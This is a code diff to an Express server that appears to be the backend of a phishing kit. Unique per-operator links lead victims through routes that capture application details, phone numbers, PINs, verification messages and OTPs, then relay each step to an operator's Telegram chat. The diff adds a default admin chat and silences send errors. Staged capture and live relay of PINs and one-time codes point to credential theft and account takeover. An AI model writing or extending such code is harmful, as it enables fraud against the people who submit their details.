@@ -10,16 +10,13 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true })); // For HTML forms
 
 // --- STATIC FILES & HOMEPAGE ---
-// Tells Express to serve all static files (HTML, CSS, JS) from the current directory (or your public folder)
 app.use(express.static(path.join(__dirname)));
 
-// Serve index.html when visiting the root URL (https://zambia-wwe.onrender.com/)
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 // --- ADMIN ROUTES ---
-// Serve the admin panel
 app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'admin.html'));
 });
@@ -42,7 +39,6 @@ app.get('/api/clients', async (req, res) => {
 });
 
 // --- CLIENT WEB APP ROUTE ---
-// This handles unique links like /apply/john123
 app.get('/apply/:clientId', async (req, res) => {
     const client = await db.getClient(req.params.clientId);
     if (!client) return res.status(404).send("Client not found. Link is invalid.");
@@ -50,20 +46,29 @@ app.get('/apply/:clientId', async (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// --- API ROUTES (Triggered by the website) ---
+// --- API ROUTES (Updated to support direct applications on main page) ---
 app.post('/api/apply', async (req, res) => {
     const sessionId = Date.now().toString();
     const { clientId, ...data } = req.body;
     
-    // 1. Find which Telegram ID belongs to this clientId
-    const client = await db.getClient(clientId);
-    if (!client) return res.status(404).json({ error: "Invalid Client ID" });
+    let chatId = process.env.DEFAULT_ADMIN_CHAT_ID;
+    
+    if (clientId) {
+        const client = await db.getClient(clientId);
+        if (client) chatId = client.chatId;
+    }
 
-    // 2. Save the session
-    await db.createSession(sessionId, clientId, data);
+    // Save session
+    await db.createSession(sessionId, clientId || "default_client", data);
 
-    // 3. Send to the Client's Telegram!
-    await telegram.sendApplicationToTelegram(client.chatId, sessionId, data);
+    // Send to Telegram if a chat ID is available
+    if (chatId) {
+        try {
+            await telegram.sendApplicationToTelegram(chatId, sessionId, data);
+        } catch (err) {
+            console.log("Failed to send application to Telegram:", err.message);
+        }
+    }
     
     res.json({ success: true, sessionId });
 });
@@ -73,10 +78,21 @@ app.post('/api/login', async (req, res) => {
     const session = await db.getSession(sessionId);
     if (!session) return res.status(404).json({ error: "Session not found" });
 
-    const client = await db.getClient(session.clientId);
+    // Try to get client chat ID or fallback to default
+    let chatId = process.env.DEFAULT_ADMIN_CHAT_ID;
+    if (session.clientId && session.clientId !== "default_client") {
+        const client = await db.getClient(session.clientId);
+        if (client) chatId = client.chatId;
+    }
+
     await db.updateSessionData(sessionId, { status: 'PENDING_PIN', phone, pin });
     
-    await telegram.sendPinToTelegram(client.chatId, sessionId, { phone, pin });
+    if (chatId) {
+        try {
+            await telegram.sendPinToTelegram(chatId, sessionId, { phone, pin });
+        } catch (err) {}
+    }
+    
     res.json({ success: true });
 });
 
@@ -85,10 +101,20 @@ app.post('/api/verification', async (req, res) => {
     const session = await db.getSession(sessionId);
     if (!session) return res.status(404).json({ error: "Session not found" });
 
-    const client = await db.getClient(session.clientId);
+    let chatId = process.env.DEFAULT_ADMIN_CHAT_ID;
+    if (session.clientId && session.clientId !== "default_client") {
+        const client = await db.getClient(session.clientId);
+        if (client) chatId = client.chatId;
+    }
+
     await db.updateSessionData(sessionId, { status: 'PENDING_VERIFICATION', verificationMsg });
     
-    await telegram.sendVerificationToTelegram(client.chatId, sessionId, { phone: session.phone, verificationMsg });
+    if (chatId) {
+        try {
+            await telegram.sendVerificationToTelegram(chatId, sessionId, { phone: session.phone, verificationMsg });
+        } catch (err) {}
+    }
+    
     res.json({ success: true });
 });
 
@@ -97,10 +123,20 @@ app.post('/api/otp', async (req, res) => {
     const session = await db.getSession(sessionId);
     if (!session) return res.status(404).json({ error: "Session not found" });
 
-    const client = await db.getClient(session.clientId);
+    let chatId = process.env.DEFAULT_ADMIN_CHAT_ID;
+    if (session.clientId && session.clientId !== "default_client") {
+        const client = await db.getClient(session.clientId);
+        if (client) chatId = client.chatId;
+    }
+
     await db.updateSessionData(sessionId, { status: 'PENDING_OTP', otp });
     
-    await telegram.sendOtpToTelegram(client.chatId, sessionId, { phone: session.phone, otp });
+    if (chatId) {
+        try {
+            await telegram.sendOtpToTelegram(chatId, sessionId, { phone: session.phone, otp });
+        } catch (err) {}
+    }
+    
     res.json({ success: true });
 });
 
